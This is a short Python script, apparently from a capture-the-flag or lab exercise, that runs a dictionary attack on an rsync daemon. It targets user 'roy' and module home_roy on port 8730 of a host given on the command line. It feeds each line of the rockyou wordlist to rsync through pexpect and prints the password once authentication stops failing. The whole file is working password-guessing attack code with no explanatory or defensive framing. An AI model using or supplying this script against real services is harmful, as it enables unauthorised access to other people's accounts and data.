import os
import sys
import subprocess
import pexpect

rsync_con = "rsync -av roy@["+sys.argv[1]+"]::home_roy . --port=8730"


password = open("/root/rockyou.txt")
line = password.readline()
while line:
    line = line.strip('\n')
    rsync = pexpect.spawn(rsync_con)
    rsync.expect("Password: ")
    rsync.sendline(line)
    rsync.readline()
    rsync.readline()
    result = rsync.readline()
    if result.find("error starting client-server protocol (code 5)") != -1: print("password: "+line+" wrong.")
    else: 
        print("PASSWORD FOUND! : "+line)
        break;
    line = password.readline()
